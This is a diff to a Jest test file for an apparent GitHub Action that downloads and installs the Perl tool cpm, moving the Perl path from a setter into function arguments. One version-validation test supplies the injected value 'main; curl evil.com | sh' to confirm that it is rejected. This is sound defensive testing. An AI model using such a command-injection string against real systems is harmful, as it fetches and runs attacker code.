@@ -147,9 +147,7 @@ describe("install_cpm_location", () => {
             }
             return 0;
         });
-        lib.set_perl("/usr/bin/perl");
-
-        const result = await lib.install_cpm_location();
+        const result = await lib.install_cpm_location("/usr/bin/perl");
 
         expect(exec.exec).toHaveBeenCalledWith(
             "/usr/bin/perl",
@@ -170,9 +168,8 @@ describe("install_cpm", () => {
         tc.downloadTool.mockResolvedValue("/tmp/cpm-downloaded");
         exec.exec.mockResolvedValue(0);
         jest.spyOn(os, "platform").mockReturnValue("linux");
-        lib.set_perl("/usr/bin/perl");
 
-        const result = await lib.install_cpm("/usr/local/bin/cpm");
+        const result = await lib.install_cpm("/usr/bin/perl", "/usr/local/bin/cpm");
 
         expect(tc.downloadTool).toHaveBeenCalledWith(
             "https://raw.githubusercontent.com/skaji/cpm/main/cpm"
@@ -190,9 +187,8 @@ describe("install_cpm", () => {
         tc.downloadTool.mockResolvedValue('/tmp/cpm "$pecial');
         exec.exec.mockResolvedValue(0);
         jest.spyOn(os, "platform").mockReturnValue("linux");
-        lib.set_perl("/usr/bin/perl");
 
-        await lib.install_cpm('/usr/local/bin/"cpm');
+        await lib.install_cpm("/usr/bin/perl", '/usr/local/bin/"cpm');
 
         // Find the copy+chmod exec call (not the first which is install_cpm_location)
         const copyCall = exec.exec.mock.calls.find(
@@ -218,7 +214,7 @@ describe("install_cpm", () => {
         io.cp.mockResolvedValue();
         jest.spyOn(os, "platform").mockReturnValue("win32");
 
-        const result = await lib.install_cpm("/usr/local/bin/cpm");
+        const result = await lib.install_cpm("/usr/bin/perl", "/usr/local/bin/cpm");
 
         expect(io.cp).toHaveBeenCalledWith(
             "/tmp/cpm-downloaded",
@@ -844,9 +840,8 @@ describe("install_cpm version validation", () => {
             if (name === "sudo") return "false";
             return "";
         });
-        lib.set_perl("/usr/bin/perl");
 
-        await expect(lib.install_cpm("/usr/local/bin/cpm")).rejects.toThrow(
+        await expect(lib.install_cpm("/usr/bin/perl", "/usr/local/bin/cpm")).rejects.toThrow(
             /invalid version/i
         );
         expect(tc.downloadTool).not.toHaveBeenCalled();
@@ -857,9 +852,8 @@ describe("install_cpm version validation", () => {
             if (name === "version") return "main; curl evil.com | sh";
             return "";
         });
-        lib.set_perl("/usr/bin/perl");
 
-        await expect(lib.install_cpm("/usr/local/bin/cpm")).rejects.toThrow(
+        await expect(lib.install_cpm("/usr/bin/perl", "/usr/local/bin/cpm")).rejects.toThrow(
             /invalid version/i
         );
     });
@@ -869,9 +863,8 @@ describe("install_cpm version validation", () => {
             if (name === "version") return "";
             return "";
         });
-        lib.set_perl("/usr/bin/perl");
 
-        await expect(lib.install_cpm("/usr/local/bin/cpm")).rejects.toThrow(
+        await expect(lib.install_cpm("/usr/bin/perl", "/usr/local/bin/cpm")).rejects.toThrow(
             /invalid version/i
         );
     });
@@ -885,9 +878,8 @@ describe("install_cpm version validation", () => {
         tc.downloadTool.mockResolvedValue("/tmp/cpm-downloaded");
         exec.exec.mockResolvedValue(0);
         jest.spyOn(os, "platform").mockReturnValue("linux");
-        lib.set_perl("/usr/bin/perl");
 
-        await lib.install_cpm("/usr/local/bin/cpm");
+        await lib.install_cpm("/usr/bin/perl", "/usr/local/bin/cpm");
 
         expect(tc.downloadTool).toHaveBeenCalledWith(
             "https://raw.githubusercontent.com/skaji/cpm/0.997014/cpm"
@@ -903,9 +895,8 @@ describe("install_cpm version validation", () => {
         tc.downloadTool.mockResolvedValue("/tmp/cpm-downloaded");
         exec.exec.mockResolvedValue(0);
         jest.spyOn(os, "platform").mockReturnValue("linux");
-        lib.set_perl("/usr/bin/perl");
 
-        await lib.install_cpm("/usr/local/bin/cpm");
+        await lib.install_cpm("/usr/bin/perl", "/usr/local/bin/cpm");
 
         expect(tc.downloadTool).toHaveBeenCalled();
     });
@@ -919,9 +910,8 @@ describe("install_cpm version validation", () => {
         tc.downloadTool.mockResolvedValue("/tmp/cpm-downloaded");
         exec.exec.mockResolvedValue(0);
         jest.spyOn(os, "platform").mockReturnValue("linux");
-        lib.set_perl("/usr/bin/perl");
 
-        await lib.install_cpm("/usr/local/bin/cpm");
+        await lib.install_cpm("/usr/bin/perl", "/usr/local/bin/cpm");
 
         expect(tc.downloadTool).toHaveBeenCalled();
     });
@@ -970,9 +960,8 @@ describe("install_cpm_location with backslash path", () => {
             }
             return 0;
         });
-        lib.set_perl("/usr/bin/perl");
 
-        await lib.install_cpm_location();
+        await lib.install_cpm_location("/usr/bin/perl");
 
         // The path should have backslashes escaped for Perl string interpolation
         const execArgs = exec.exec.mock.calls[0];
@@ -1083,7 +1072,6 @@ describe("cpm_cache_dir", () => {
 
 describe("install_cpm caching", () => {
     beforeEach(() => {
-        lib.set_perl("/usr/bin/perl");
         jest.spyOn(os, "platform").mockReturnValue("linux");
     });
 
@@ -1096,7 +1084,7 @@ describe("install_cpm caching", () => {
         cache.restoreCache.mockResolvedValue("cpm-script-0.997014-linux");
         exec.exec.mockResolvedValue(0);
 
-        const result = await lib.install_cpm("/usr/local/bin/cpm");
+        const result = await lib.install_cpm("/usr/bin/perl", "/usr/local/bin/cpm");
 
         expect(tc.downloadTool).not.toHaveBeenCalled();
         expect(cache.saveCache).not.toHaveBeenCalled();
@@ -1118,7 +1106,7 @@ describe("install_cpm caching", () => {
         io.cp.mockResolvedValue();
         io.mkdirP.mockResolvedValue();
 
-        const result = await lib.install_cpm("/usr/local/bin/cpm");
+        const result = await lib.install_cpm("/usr/bin/perl", "/usr/local/bin/cpm");
 
         expect(tc.downloadTool).toHaveBeenCalledWith(
             "https://raw.githubusercontent.com/skaji/cpm/0.997014/cpm"
@@ -1143,7 +1131,7 @@ describe("install_cpm caching", () => {
         io.cp.mockResolvedValue();
         io.mkdirP.mockResolvedValue();
 
-        await lib.install_cpm("/usr/local/bin/cpm");
+        await lib.install_cpm("/usr/bin/perl", "/usr/local/bin/cpm");
 
         const today = new Date().toISOString().slice(0, 10);
         expect(cache.saveCache).toHaveBeenCalledWith(
@@ -1164,7 +1152,7 @@ describe("install_cpm caching", () => {
         io.cp.mockResolvedValue();
         io.mkdirP.mockResolvedValue();
 
-        await lib.install_cpm("/usr/local/bin/cpm");
+        await lib.install_cpm("/usr/bin/perl", "/usr/local/bin/cpm");
 
         // Should fall back to download
         expect(tc.downloadTool).toHaveBeenCalled();
@@ -1184,7 +1172,7 @@ describe("install_cpm caching", () => {
         io.mkdirP.mockResolvedValue();
 
         // Should not throw
-        await lib.install_cpm("/usr/local/bin/cpm");
+        await lib.install_cpm("/usr/bin/perl", "/usr/local/bin/cpm");
 
         expect(core.info).toHaveBeenCalledWith(
             expect.stringContaining("Cache save failed")
